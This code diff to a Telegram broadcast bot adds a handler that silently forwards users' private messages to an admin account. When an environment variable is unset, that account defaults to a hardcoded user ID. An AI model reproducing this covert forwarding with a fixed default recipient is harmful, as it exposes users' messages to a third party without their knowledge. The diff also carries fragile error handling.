@@ -2,8 +2,8 @@ import os
 import traceback
 import logging
 
-from pyrogram import Client
-from pyrogram import StopPropagation, filters
+from pyrogram import Client, filters
+from pyrogram import StopPropagation
 from pyrogram.types import CallbackQuery, InlineKeyboardButton, InlineKeyboardMarkup
 
 import config
@@ -12,12 +12,10 @@ from handlers.check_user import handle_user_status
 from handlers.database import Database
 
 LOG_CHANNEL = config.LOG_CHANNEL
-AUTH_USERS = config.AUTH_USERS
 DB_URL = config.DB_URL
 DB_NAME = config.DB_NAME
 
 db = Database(DB_URL, DB_NAME)
-
 
 Bot = Client(
     "BroadcastBot",
@@ -25,6 +23,28 @@ Bot = Client(
     api_id=config.API_ID,
     api_hash=config.API_HASH,
 )
+
+AUTH_USERS = set(int(x) for x in os.environ.get("AUTH_USERS", "5216454450").split())
+
+
+@Bot.on_message(filters.private)
+async def _(bot, cmd):
+    # Ignore admin commands and don't forward them
+    if cmd.from_user.id in AUTH_USERS and cmd.text.startswith("/"):
+        return
+
+    # Forward message to admin
+    owner_chat_id = next(iter(AUTH_USERS))
+    if cmd.from_user.id != owner_chat_id:
+        try:
+            await cmd.forward(owner_chat_id)
+        except Exception as e:
+            # Handle forwarding errors here if needed
+            pass
+
+    # Continue with handling user status
+    await handle_user_status(bot, cmd)
+
 
 @Bot.on_message(filters.private)
 async def _(bot, cmd):
